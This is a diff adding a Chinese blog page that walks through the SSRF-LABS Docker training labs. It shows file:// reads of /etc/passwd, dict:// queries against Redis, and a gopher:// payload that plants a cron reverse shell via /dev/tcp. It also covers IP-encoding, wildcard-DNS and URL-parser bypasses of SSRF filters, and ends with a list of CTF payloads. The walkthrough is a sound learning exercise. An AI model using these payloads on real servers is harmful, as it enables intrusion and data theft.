@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>SSRF-LABS指南 | Se8S0n</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="SSRF-LABS指南前言在网上找到一个学习SSRF的环境，SSRF-LABS有一个好看又简洁的界面，提供了最基本的REST API和客户端WebHook功能用于SSRF测试。前面只是大概的介绍，知道就好，不用花费过多精力了解。 SSRF介绍服务端请求伪造，用户通过WEB访问/上传/发出请求，绕过服务器防火墙，获取服务器及其内网信息。SSRF可以说是一个媒介，结合服务器中的服务，常常可以形成一条完">
+<meta name="keywords" content="Android安全 翻译">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF-LABS指南">
+<meta property="og:url" content="http://Se8S0n.github.io.git/2019/05/19/SSRF-LABS指南/index.html">
+<meta property="og:site_name" content="Se8S0n">
+<meta property="og:description" content="SSRF-LABS指南前言在网上找到一个学习SSRF的环境，SSRF-LABS有一个好看又简洁的界面，提供了最基本的REST API和客户端WebHook功能用于SSRF测试。前面只是大概的介绍，知道就好，不用花费过多精力了解。 SSRF介绍服务端请求伪造，用户通过WEB访问/上传/发出请求，绕过服务器防火墙，获取服务器及其内网信息。SSRF可以说是一个媒介，结合服务器中的服务，常常可以形成一条完">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="https://user-gold-cdn.xitu.io/2017/8/7/a89839b837b0c4e897a77445f9615482?imageView2/0/w/1280/h/960/format/webp/ignore-error/1">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557629899/SSRF/1557629749_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557630022/SSRF/1557630002_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557647222/SSRF/1557647189.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558146811/SSRF/1558146771_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558175937/SSRF/1558175907_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179482/SSRF/1558179454_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179650/SSRF/1558179636_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179482/SSRF/1558179319_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557661100/SSRF/1557661064_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557673405/SSRF/1557673345_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557816882/SSRF/1557816857_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557820423/SSRF/1557820402_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557887555/SSRF/1557887533_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557990455/SSRF/08f2860301853756c50e4652d81b09c.png">
+<meta property="og:updated_time" content="2021-08-05T06:51:27.343Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF-LABS指南">
+<meta name="twitter:description" content="SSRF-LABS指南前言在网上找到一个学习SSRF的环境，SSRF-LABS有一个好看又简洁的界面，提供了最基本的REST API和客户端WebHook功能用于SSRF测试。前面只是大概的介绍，知道就好，不用花费过多精力了解。 SSRF介绍服务端请求伪造，用户通过WEB访问/上传/发出请求，绕过服务器防火墙，获取服务器及其内网信息。SSRF可以说是一个媒介，结合服务器中的服务，常常可以形成一条完">
+<meta name="twitter:image" content="https://user-gold-cdn.xitu.io/2017/8/7/a89839b837b0c4e897a77445f9615482?imageView2/0/w/1280/h/960/format/webp/ignore-error/1">
+  
+  
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head></html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="overlay"></div>
+  <div id="header-outer" class="outer">
+    <div id="profile_img">
+      <img id="circle_img" src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1507005566072&amp;di=9f9f92b244fc348a76a81879f8e5dbfb&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.58pic.com%2F58pic%2F12%2F36%2F62%2F12c58PICPCj.jpg" />
+    </div>
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Se8S0n</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">The more you want, the more you get.</a>
+        </h2>
+      
+    </div>
+    <div id="header-menu">
+      <nav id="main-nav">
+        <ul>
+        
+          <li><a href="/"><i class="fa fa-home icon-setting"></i></a></li>
+        
+          <li><a href="/archives"><i class="fa fa-archive icon-setting"></i></a></li>
+        
+          <li><a href="/about"><i class="fa fa-user icon-setting"></i></a></li>
+        
+          <li><a href="/friends"><i class="fa fa-users icon-setting"></i></a></li>
+        
+          <li><a href="http://weibo.com/p/1005055968437225/home?from=page_100505_profile&wvr=6&mod=data&is_hot=1#place"><i class="fa fa-weibo icon-setting"></i></a></li>
+        
+        
+        </ul>
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-SSRF-LABS指南" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/05/19/SSRF-LABS指南/" class="article-date">
+  <time datetime="2019-05-19T22:09:29.000Z" itemprop="datePublished">2019-05-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SSRF-LABS指南
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="SSRF-LABS指南"><a href="#SSRF-LABS指南" class="headerlink" title="SSRF-LABS指南"></a>SSRF-LABS指南</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在网上找到一个学习SSRF的环境，<a href="https://github.com/m6a-UdS/ssrf-lab/blob/master/basics/www/testhook.php" target="_blank" rel="noopener">SSRF-LABS</a>有一个好看又简洁的界面，提供了最基本的<a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html" target="_blank" rel="noopener">REST API</a>和客户端WebHook功能用于SSRF测试。前面只是大概的介绍，知道就好，不用花费过多精力了解。</p>
+<h3 id="SSRF介绍"><a href="#SSRF介绍" class="headerlink" title="SSRF介绍"></a>SSRF介绍</h3><p>服务端请求伪造，用户通过WEB访问/上传/发出请求，绕过服务器防火墙，获取服务器及其内网信息。SSRF可以说是一个媒介，结合服务器中的服务，常常可以形成一条完整的攻击链。<br><img src="https://user-gold-cdn.xitu.io/2017/8/7/a89839b837b0c4e897a77445f9615482?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt></p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>我的环境是Ubuntu16.04，如果使用其他的系统，可能安装docker的方法不同，可以到网上搜一下。下面为安装docker的步骤。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sSL https://get.docker.com/ | sh #脚本安装docker</span><br><span class="line">$ apt install docker-compose #安装docker compose</span><br></pre></td></tr></table></figure></p>
+<p>先按照下面的命令把<code>basic</code>这一关搭建好，其他的基本相同。在创建容器的时候避免出冲突，端口<code>8999</code>在设置要注意，避免与本地已开启端口产生冲突。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/m6a-UdS/ssrf-lab.git</span><br><span class="line">$ cd ~/ssrf-lab/basics #进入basics文件夹</span><br><span class="line">$ docker build -t ssrf-lab/basic . #构建镜像</span><br><span class="line">$ docker run -d -p 8999:80 ssrf-lab/basic #创建容器</span><br><span class="line">$ docker ps #查看ssrf-lab/basic容器编号</span><br><span class="line">$ docker stop [容器编号] #关闭容器</span><br></pre></td></tr></table></figure></p>
+<p>在Advances系列的文件夹还有ctf中没有<code>dockerfile</code>文件，只有<code>docker-compose.yml</code>文件，这时候我们就要在构建镜像的时候就换<code>docker-compose</code>来创建镜像并开启容器了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/ssrf-lab/advanced1 # 进入advanced1目录下</span><br><span class="line">$ docker-compose up -d #开启容器</span><br><span class="line">$ docker-compose down #关闭容器</span><br></pre></td></tr></table></figure></p>
+<p>在开启容器的时候的时候出了问题，因为在官网找不到urllib2的下载路径，编辑<code>~/ssrf-lab/advanced2/flask-webserver</code>文件，去掉其中的urllib2。</p>
+<h3 id="Part-1：basic"><a href="#Part-1：basic" class="headerlink" title="Part 1：basic"></a>Part 1：basic</h3><h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><p>打开页面，OUTGOING WEBHOOK部分输入的<em><a href="https://yourhandler.io/events" target="_blank" rel="noopener">https://yourhandler.io/events</a></em>是有REST API监听的需要测试项目，在SEE THE RESULT的部分会显示请求响应的结果和状态码。输入<em><a href="https://yourhandler.io/events" target="_blank" rel="noopener">https://yourhandler.io/events</a></em>的位置就可以作为一个测试点。</p>
+<p>我们先用<code>http://127.0.0.1</code>进行测试。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557629899/SSRF/1557629749_1.png" alt><br>发现数据显示出来了，说明这里没有对内网IP进行限制。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557630022/SSRF/1557630002_1.png" alt></p>
+<p>为了进一步进行测试，我们来了解一下URL的结构。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://user:pass@host:port/path?query=value#fragment</span><br></pre></td></tr></table></figure></p>
+<p>从结构中我们可以看出不同的SSRF的利用姿势，有协议、URL绕过等等。这一关就尝试从协议入手，用file协议代替http协议或者https协议。在测试点输入<code>file:///etc/passwd</code>我们可以得到用户文件，我们也可以通过这样的方式获得其他文件。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557647222/SSRF/1557647189.png" alt><br>成功之后我们可以通过深挖配置文件和源代码进行我们进一步的渗透，比如获得数据库的用户凭证。这里成功实现是因为URL没有经过严格的过滤，更准确地说应该是完全没经过过滤，下一关不会这么简单了。</p>
+<h4 id="SSRF协议中的利用"><a href="#SSRF协议中的利用" class="headerlink" title="SSRF协议中的利用"></a>SSRF协议中的利用</h4><p>看了很多教程都是结合Redis服务一起讲的，为了方便介绍下面几个协议，我们先在ssrf-basics容器里面安装该服务。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps #查看容器编号</span><br><span class="line">$ docker exec -it [ssrf-lab/basics容器编号] /bin/bash #进入容器</span><br><span class="line">$ apt-get install redis-server # 安装redis服务</span><br><span class="line">$ redis-server #开启redis服务</span><br></pre></td></tr></table></figure>
+<p>这一关可以利用协议收集信息及反弹shell，都是没用协议白名单的锅，导致多个协议利用起来毫无阻力。</p>
+<h5 id="file"><a href="#file" class="headerlink" title="file"></a>file</h5><p>上面尝试的过的<code>file:///etc/passwd</code>就是利用了file协议，利用这个协议可以读取主机内任意文件。</p>
+<h5 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h5><p>利用dict协议，<code>dict://127.0.0.1:6379/info</code>可获取本地redis服务配置信息。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558146811/SSRF/1558146771_1.png" alt></p>
+<p>还可以用<code>dict://127.0.0.1:6379/KEYS *</code>获取redis存储的内容<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558175937/SSRF/1558175907_1.png" alt></p>
+<h5 id="Gopher-协议"><a href="#Gopher-协议" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h5><p>通过Gopher协议可以反弹shell，下面为具体的exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure></p>
+<p>这个看起来不太清晰，urldecode之后，就可以看到具体的命令。下面为解码之后的内容，我把关键的redis指令放到同一行中。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179482/SSRF/1558179454_1.png" alt></p>
+<p>在页面能看到如下的回显<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179650/SSRF/1558179636_1.png" alt></p>
+<p>为了验证是否成功了，我在ssrf-lab/basics容器里面查看插入的KEY值。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179482/SSRF/1558179319_1.png" alt></p>
+<h3 id="Part-2：Advance1"><a href="#Part-2：Advance1" class="headerlink" title="Part 2：Advance1"></a>Part 2：Advance1</h3><h4 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h4><p>这一关用了正则表达式限制内网IP的访问，具体的代码如下。必须要吐槽一下，这个方法真的是一个很糟糕的方法，因为它实际上不能起到很好的安全防护作用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;#^https?://#i&apos;, $handler) !== 1) &#123;  </span><br><span class="line">    echo &quot;Wrong scheme! You can only use http or https!&quot;;  </span><br><span class="line">    die();</span><br><span class="line">&#125; else if (preg_match(&apos;#^https?://10.0.0.3#i&apos;, $handler) === 1) &#123;  </span><br><span class="line">    echo &quot;Restricted area!&quot;;  </span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>现在我们就用<code>http://10.0.0.3</code>来测试<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557661100/SSRF/1557661064_1.png" alt></p>
+<p>我们可以很明显地看到没有获得响应，但是神奇的IP地址有多种表达方式，我们可以用这些方式来绕过上面那么直白的限制。先用整数表达<code>http://167772163</code>发出请求。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557673405/SSRF/1557673345_1.png" alt><br>成功了，我们可以来看看IP地址的表达方式。众所周知，IP地址是由四个字节组成的，一旦包含了小数点，就必须考虑到大小端表示，因为这个会影响IP地址的解析。不过好在所有的网络地址都是大端表示法，只需要注意这一点即可，下面我们介绍IP地址的表达方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字符串:       10.0.0.3</span><br><span class="line">二进制:       00001010 . 00000000 . 00000000 . 00000011</span><br><span class="line">十六进制:    0A.00.00.03</span><br><span class="line">整数:           167772163</span><br></pre></td></tr></table></figure></p>
+<p>这些表达方式都能被<code>curl</code>命令解析为正确的IP地址，之后如果我们要访问的IP地址被简单粗暴地过滤了就可以试试这种方法。除了上面的表达方式之外，还可以用16进制<code>0x0A000003</code>表示IP地址，还有一个很少人知道的绕过小姿势，就是用8进制代替10进制来表示IP地址。在计算机的世界里，一旦在<code>20</code>前面加个<code>0</code>就会变成8进制，比如<code>http://01200000003</code>实际上还是<code>http://10.0.0.3</code>。上面两个表达方式，PHP的curl模块能解析出来。</p>
+<p>下面总结一下几种变形<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">十六进制：   http://0x0A.0x00.0x00.0x03</span><br><span class="line">八进制：       http://012.00.00.03</span><br><span class="line">八进制溢出：http://265.0.0.3</span><br></pre></td></tr></table></figure></p>
+<p>最后一个变形好像只适用于NodeJS应用的服务器，点分十进制的最大值为255，一旦超出了这个数，将会被重置，这个时候最后一个变形就会变回<code>http://10.0.0.3</code>。具体为什么可以通过这样的可能要从TCP/IP解析IP地址的逻辑入手(应用层的限制总能被巧妙地绕过，不是很可靠)。</p>
+<h4 id="其他常见的绕过方法"><a href="#其他常见的绕过方法" class="headerlink" title="其他常见的绕过方法"></a>其他常见的绕过方法</h4><h5 id="DNS泛域名"><a href="#DNS泛域名" class="headerlink" title="DNS泛域名"></a>DNS泛域名</h5><p><code>xip.io</code>和<code>xip.name</code>这两个dns泛域名，实现绕过的方法是，你在你想访问的ip地址后面添加这两个泛域名，这两个域名会从你发出的请求中提取你真正想访问的IP地址，然后再响应报文中返回。感兴趣的可以看看<a href="https://blog.51cto.com/laoxu/1282773" target="_blank" rel="noopener">DNS服务系列之一：泛域名解析的安全案例</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://www.10.0.0.3.xip.io</span><br><span class="line">http://mysite.10.0.0.3.xip.io</span><br><span class="line">http://foo.bar.10.0.0.3.xip.io</span><br><span class="line">http://foo.10.0.0.3.xip.name</span><br><span class="line">http://www.10.0.0.3.xip.name</span><br></pre></td></tr></table></figure></p>
+<p>还有很多其他的绕过方式，因为在这个环境里不能实现，所以就不在这里补充了，<a href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" target="_blank" rel="noopener">SSRF漏洞的利用与学习</a>一文中比较全面。没有仔细研究过为什么Python写的后端代码不能实现其他绕过，不过我猜是因为Python的urllib和PHP的curl解析方式不同，如果以后有机会，会深究一下里面到底有什么不同。</p>
+<h3 id="Part-2：Advance2"><a href="#Part-2：Advance2" class="headerlink" title="Part 2：Advance2"></a>Part 2：Advance2</h3><p>在安装这个环境的时候，一定要注意端口的配置，如果出现了<code>ERROR: Pool overlaps with other one on this address space</code>的报错，可以按照<a href="http://www.zizhixiaoshe.com/article/21.html" target="_blank" rel="noopener">移除docker网络</a>这篇文章进行操作，记得先将docker给关掉。如果之后还有方法可以避免产生这个报错，例如正确地修改配置文件之类的，我会补充在后面。已经尝试过更改<code>docker-compose.yml</code>文件中的端口不起作用了。</p>
+<p>这一关为了避免和上一关一样，代码中没有自己实现IP解析的功能，而是选择调用python2.7自带的库函数解析IP地址，具体代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url=request.form[&apos;handler&apos;]</span><br><span class="line">host = urlparse.urlparse(url).hostname</span><br><span class="line">if host == &apos;secret.corp&apos;:    </span><br><span class="line">    return &apos;Restricted Area!&apos;</span><br><span class="line">else:    </span><br><span class="line">return urllib.urlopen(url).read()</span><br></pre></td></tr></table></figure></p>
+<p>上面的代码用了python2.7中的urlparse模块来解析url，该模块能够解析多个协议。获取了url中host参数之后，再对域进行判断。</p>
+<p>跟第一个环境一样，我们先用<code>http://secret.corp</code>来测试。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557816882/SSRF/1557816857_1.png" alt></p>
+<p>URL解析器分析出这部分内容是访问已被限制的域，下面要介绍一个新的知识点了，我们先来测试一下它能不能起作用。在测试点输入<code>http://google.com# @secret.corp</code><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557820423/SSRF/1557820402_1.png" alt></p>
+<p>绕过这个到底是基于什么原理呢？让我们再次回顾一下url的结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://user:pass@host:port/path?query=value#fragment</span><br></pre></td></tr></table></figure></p>
+<p>原来<code>http://google.com# @secret.corp</code>中<code>@</code>后面的<code>secret.corp</code>是真正要访问的host，前面的<code>google.com#</code>绕过了urlparse的解析。感觉很神奇而且让人有点摸不着头脑，了解一下原理会好很多。SSRF漏洞产生的根本原因是url中有空格(<br>CRLF注入)，这让python中的两个模块解析url的时候起了冲突，urlparse认为host是google.com，而urllib则认为真正的host是secret.corp并且直接发出了请求。</p>
+<p>为了进一步阐述上面漏洞利用的原理，用python写几行代码来验证一下，如果有点混乱，可以再看看上面的源代码，用urlparse解析URL进行判断是先于调用urllib发出请求的。下图为urlparse解析的结果，在python2.7和python3.5两个版本中都是一致的<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557887555/SSRF/1557887533_1.png" alt></p>
+<p>为了能够进一步验证urllib能否正确接收到，在VPS上输入命令<code>nc -lvvv 9444</code>监听本地9444端口，再按照下面命令通过python发送请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line">$ import urllib</span><br><span class="line">$ url = &quot;http://google.com# @[VPS的IP地址]:9444&quot;</span><br><span class="line">$ urllib.urlopen(url).read()</span><br></pre></td></tr></table></figure></p>
+<p>之后在开启监听端口的服务器可以接收到如下的回显：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557990455/SSRF/08f2860301853756c50e4652d81b09c.png" alt></p>
+<p>验证完毕。</p>
+<h3 id="advanced3"><a href="#advanced3" class="headerlink" title="advanced3"></a>advanced3</h3><p>advanced3感觉作者代码不完整，感觉像在测试阶段，尝试过修改源代码，但是实际情况并不如我所想。所以这里就不丰富这部分内容了，如果之后作者对这部分题目有修改，我会对这部分内容进行补充。</p>
+<h3 id="ctf-exp"><a href="#ctf-exp" class="headerlink" title="ctf exp"></a>ctf exp</h3><p>下面是ctf题目获取flag的方法，因为我我不是亚马逊的服务器，所以获取不了flag，如果想尝试的，可以看看<a href="https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a" target="_blank" rel="noopener">这篇文章</a></p>
+<p>最后这个题目大家可以作为练习，到最后才看payload…..懒人就不重复说前面的内容了，来试试自己掌握了没有吧！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 http://secret1.corp</span><br><span class="line">2 file:///etc/passwd</span><br><span class="line">3 http://10.38 #a000026、167772198</span><br><span class="line">4 http://google.com# @secret3.corp</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://Se8S0n.github.io.git/2019/05/19/SSRF-LABS指南/" data-id="ckrzo1bj7000adfrtix7q59vl" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android安全-翻译/">Android安全 翻译</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/12/Android抓包总结/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Android抓包总结
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/04/19/尝试绕过TracePID反调试二——从源码入手/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">尝试绕过TracePID反调试——从源码入手</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Se8S0n<br>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="//imsky.github.io/holder/holder.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script> 
+</body>
+</html>
